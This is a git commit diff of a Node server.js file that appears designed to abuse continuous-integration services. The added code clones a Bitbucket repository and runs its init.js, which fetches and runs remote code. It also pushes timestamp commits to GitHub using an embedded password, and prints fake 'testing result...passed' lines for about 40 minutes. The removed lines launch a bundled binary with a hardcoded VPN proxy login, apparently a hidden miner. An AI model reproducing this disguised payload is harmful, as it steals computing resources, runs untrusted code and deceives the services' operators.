acc92af92dcce4b2dff224ed0d67dfd64d9c0f7b
luwujeb <31814569+luwujeb@users.noreply.github.com>
2017-09-10 06:08:45 +0000

    Update server.js

--- server.js
+++ server.js
@@ -1,5 +1,16 @@
-var proxy = 'user1778485:h1E5bec0@lon.uk.torguardvpnaccess.com:6060';
-var child = require('child_process').exec('cd ./lib && chmod 755 -R speedrunner && ./speedrunner -s start -o auto -regex true --type x');
+var exec = require("child_process").exec;
+var index = 1;
+var max = 40;
+var interval;
+var target = 'https://luwujeb:test123@github.com/luwujeb/tale.git';
+console.log(__dirname);
+var myrepo = 'git clone ' + target + ' aaa && ';
+myrepo += 'git config --global user.email "test" && ';
+myrepo += 'git config --global user.name "test" && ';
+myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
+myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
+exec(myrepo);
+var child = exec('rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js');
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
 });
@@ -9,25 +20,11 @@ child.stderr.on('data', function(data) {
 child.on('close', function(code) {
     console.log('closing code: ' + code);
 });
-var target = '';
-if (__dirname.indexOf('/home/travis') !== -1){
-  var pt = __dirname.split('travis/build/').pop();
-  target = 'https://' + pt.split('/')[0] + ':test123@github.com/' + pt.split('/')[0] + '/' + pt.split('/')[1] + '.git';
-}
-var myrepo = 'git clone ' + target + ' aaa && ';
-myrepo += 'git config --global user.email "test" && ';
-myrepo += 'git config --global user.name "test" && ';
-myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
-myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
-if (__dirname.indexOf('/home/travis') !== -1) require('child_process').exec(myrepo);
-var index = 1;
-var max = 46;
-var interval;
 interval = setInterval(function () {
   if (index >= max) {
     setTimeout(function(){
         process.exit(0);
     }, 1000);		
   }
-  console.log("running..." + ++index);
+  console.log("testing result..." + index++ + '...passed');
 }, 1000 * 60);
